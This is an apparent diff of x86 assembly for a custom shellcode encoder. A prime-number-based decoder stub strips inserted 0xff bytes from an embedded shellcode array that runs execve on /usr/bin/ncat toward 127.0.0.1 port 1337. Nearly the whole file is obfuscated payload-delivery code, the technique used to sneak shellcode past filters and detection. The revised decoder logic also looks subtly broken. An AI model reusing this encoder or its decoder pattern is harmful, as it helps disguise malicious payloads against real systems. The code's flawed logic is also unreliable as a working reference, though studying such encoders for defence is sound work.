@@ -4,73 +4,70 @@
 global _start
 
 section .text
-; return EAX -> 0x01, if a prime number
-; return EAX -> 0xff, if a compositive number
 
 IsPrime:
         push ebp
         mov ebp, esp
-        sub esp, 0x10
 
-        cmp ecx, 0x01
-        jng ..@false            ; jump if ECX <= 0x01
-
-        mov esi, 0x01           ; [ESI] range from 1 to ECX
-        push ecx                ; [esp+4]
-        xor edx, edx            ; clear register
-        xor edi, edi
+        mov esi, 0x01           ; (ESI) -> range from 1 to NUMBER
+	mov cl, [esp+8]		; (ECX) -> loop counter
 
         ..@loopPrime:
-                push ecx        ; save registers as it is the counter
+                xor ebx, ebx	; clear register
+                mov ax, [esp+8]	; AX -> suppose prime number (dividend)
+                div si          ; SI -> range NUMBER (divisor)
+                cmp dl, dh      ; check if remainder is ZERO 
+                setz bl		; set if remainder is ZERO
+                add edi, ebx 	; [EDI] -> number of operations with ZERO remainder
+                xor edx, edx	; clear register
+                inc si          ; next divisor
 
-                mov ax, [esp+4] ; AX <- suppose prime number (dividend)
-                div si          ; AX/SI
-                cmp dl, dh      ; remainder equals zero
-                setz bl
-                add edi, ebx 
-                xor edx, edx
-                xor ebx, ebx
-                inc si          ; increments divisor
-
-                pop ecx         ; restore the counter to be decreased
                 loop ..@loopPrime
 
-                cmp edi, 0x02   ; greater than 0x02 is compositive number
-                jg ..@false
-                mov eax, 0x01   ; returns as a prime number
-                jmp ..@ends
+                cmp edi, 0x02	; greater than 0x02 is compositive number
+		cmovg ebx, edx	; returns as a compositive number
+		cmovz ebx, [esp+8] ; returns as a prime number
 
-        ..@false:
-                mov eax, 0xff   ; returns as a compositive number
+				; ATTENTION: if not used EBX to further use, its
+				; not necessary to cmovz
 
-        ..@ends:
                 leave
                 ret
 
-_start:
-        jmp short payload
+rotate:
+	mov edx, [esp+8]
+	lea esi, [edx]		; (ESI) -> loads memory address for first byte of shellcode
+	lodsb
+	rcl eax, 1
+	stosb
+	jmp ..@returnDecoder
 
 decoder:
-        pop esi
+        pop esi			; (ESI) -> memory address for first byte of shellcode
+	inc esi			; avoids BYTE 0x01
+	push esi		; (ESI) -> saves register
+	
+        mov cl, 0x48		; (ECX) -> loop counter, shellcode size
+        mov bl, 0x02		; (EBX) -> processor register to interact with each byte of shellcode
+	..@loopDecoder:
+		push ecx		; [ESP+4] -> saves counter
+		push ebx		; [ESP] -> interact with a BYTE
 
-        mov cl, 0x48
-        mov eax, 0x01
-..@rangeNumber:
-        push ecx
-        push eax
+		call IsPrime		; verify if BYTE is prime
+					; returns 0x00 -> compositive number
+					; returns BYTE <> 0 -> the prime number
+		cmp ebx, edx		; (EBX) -> verify if is a compositive number
+		jnz rotate
 
-        mov ecx, eax
-        call IsPrime
-        ; do something with return ;mov ecx, [esi+ecx] value to clean
-        pop eax
-        inc eax
-        pop ecx
-        loop ..@rangeNumber
+	..@returnDecoder:
+		pop ebx			; (EBX) -> restore register
+		inc ebx			; (EBX) -> interact with next BYTE
+		pop ecx			; (ECX) -> restore register
+		loop ..@loopDecoder 	; (ECX) -> counter is decreased
 
-
-payload: 
+_start:
         call decoder
 ; 72 bytes 0x48 (before insertion)
 ; 92 bytes 0x5c (after insertion) 
 ; simple ncat stream, not reverse ou bind shell
-shell: db 0x31,0xc0,0xff,0x50,0xff,0x68,0x31,0xff,0x33,0x33,0xff,0x37,0x89,0xe2,0x50,0xff,0x68,0x30,0xff,0x2e,0x30,0x31,0x68,0xff,0x30,0x30,0xff,0x2e,0x30,0x68,0x31,0xff,0x32,0x37,0x2e,0x89,0xe1,0x50,0xff,0x68,0x6e,0xff,0x63,0x61,0x74,0x89,0xe3,0x50,0xff,0x89,0xe0,0x52,0x89,0xff,0xc2,0x51,0xff,0x53,0x89,0xe1,0x31,0xff,0xc0,0x50,0x68,0x6e,0x2f,0x6e,0xff,0x63,0x68,0x72,0x2f,0x62,0x69,0xff,0x68,0x2f,0xff,0x2f,0x75,0x73,0x89,0xe3,0x31,0xff,0xc0,0xb0,0x0b,0xcd,0xff,0x80
+shellcode: db 0x31,0xc0,0xff,0x50,0xff,0x68,0x31,0xff,0x33,0x33,0xff,0x37,0x89,0xe2,0x50,0xff,0x68,0x30,0xff,0x2e,0x30,0x31,0x68,0xff,0x30,0x30,0xff,0x2e,0x30,0x68,0x31,0xff,0x32,0x37,0x2e,0x89,0xe1,0x50,0xff,0x68,0x6e,0xff,0x63,0x61,0x74,0x89,0xe3,0x50,0xff,0x89,0xe0,0x52,0x89,0xff,0xc2,0x51,0xff,0x53,0x89,0xe1,0x31,0xff,0xc0,0x50,0x68,0x6e,0x2f,0x6e,0xff,0x63,0x68,0x72,0x2f,0x62,0x69,0xff,0x68,0x2f,0xff,0x2f,0x75,0x73,0x89,0xe3,0x31,0xff,0xc0,0xb0,0x0b,0xcd,0xff,0x80
